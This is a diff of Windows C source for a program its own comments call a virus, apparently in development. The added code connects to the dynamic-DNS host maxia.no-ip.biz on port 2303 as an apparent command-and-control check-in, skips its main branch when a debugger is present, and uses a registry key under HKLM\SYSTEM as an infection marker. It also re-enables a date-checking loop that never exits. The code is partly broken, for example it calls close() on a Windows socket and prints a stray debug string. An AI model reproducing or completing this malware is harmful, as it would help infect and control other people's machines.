@@ -1,87 +1,93 @@
+#define _WIN32_WINNT  0x501
 #include <winsock2.h>
 #include <windows.h>
 #include <time.h>
-#include <urlmon.h>
-#include <iostream>
+#include <stdio.h>
+#include <stdlib.h>
+#include <ws2tcpip.h>
 
 typedef int socklen_t;
-
 
 void reseau()
 {
     /*Coin reseau*/
-    SOCKET sock;
-    SOCKADDR_IN sin;
 
-    sock = socket(AF_INET, SOCK_STREAM, 0);
+    int sockfd;
+    struct addrinfo hints, *servinfo, *p;
+    int rv;
 
-    struct sockaddr_in
+    memset(&hints, 0, sizeof hints);
+    hints.ai_family = AF_UNSPEC; // use AF_INET6 to force IPv6
+    hints.ai_socktype = SOCK_STREAM;
+
+    if ((rv = getaddrinfo("maxia.no-ip.biz", "2303", &hints, &servinfo)) != 0)
     {
-        short      sin_family;
-        unsigned short   sin_port;
-        struct   in_addr   sin_addr;
-        char   sin_zero[8];
-    };
+        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
+        exit(1);
+    }
 
-
-    struct hostent *Host = gethostbyname("maxia.no-ip.biz");
-    int i = 0;
-    struct in_addr addr;
-
-    if (Host->h_addrtype == AF_INET) // si IPv4
+    // loop through all the results and connect to the first we can
+    for(p = servinfo; p != NULL; p = p->ai_next)
     {
-        while (Host->h_addr_list[i] != 0)
+        if ((sockfd = socket(p->ai_family, p->ai_socktype,
+                             p->ai_protocol)) == -1)
         {
-            addr.s_addr = *(u_long *) Host->h_addr_list[i++];
+            perror("socket");
+            continue;
         }
-    }
-    sin.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
-    sin.sin_family = AF_INET;
-    sin.sin_port = htons(7777);
 
-    while(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == -1)
+        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1)
+        {
+            close(sockfd);
+            perror("connect");
+            continue;
+        }
+        printf("Haleluya");
+        break; // if we get here, we must have connected successfully
+    }
+
+    if (p == NULL)
     {
-        Sleep(1000);
+        // looped off the end of the list with no connection
+        fprintf(stderr, "failed to connect\n");
+        exit(2);
     }
 
-    closesocket(sock);
-    /*Coin reseau*/
+    freeaddrinfo(servinfo); // all done with this structure
 }
 
 
 int main(int argc, char* argv[])
 {
+    HKEY clef;
+
+    WSADATA WSAData;
+    WSAStartup(MAKEWORD(2,2), &WSAData);
+
+    reseau();
+
     if(!IsDebuggerPresent())
     {
-
-        HKEY clef;
-
-        WSADATA WSAData;
-        WSAStartup(MAKEWORD(2,2), &WSAData);
-
         if(RegOpenKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Maxia", &clef) == ERROR_SUCCESS) // si le virus est deja la
         {
             Sleep(120000);
 
             reseau();
 
-            //bool continuer = true;
+            int continuer = 1;
 
-            /*while(continuer)
+            while(continuer)
             {
                 while(continuer)
                 {
                     time_t temps;
                     struct tm *tempslocal;
-
                     time(&temps);
                     tempslocal = localtime(&temps);
-
                     int Jour = tempslocal -> tm_mday;
                     int Mois = tempslocal -> tm_mon;
-
                 }
-            }*/
+            }
 
 
         }
@@ -130,6 +136,8 @@ int main(int argc, char* argv[])
             }
 
             WSACleanup();
+
+            //return 0;
 
             return 0;
         }
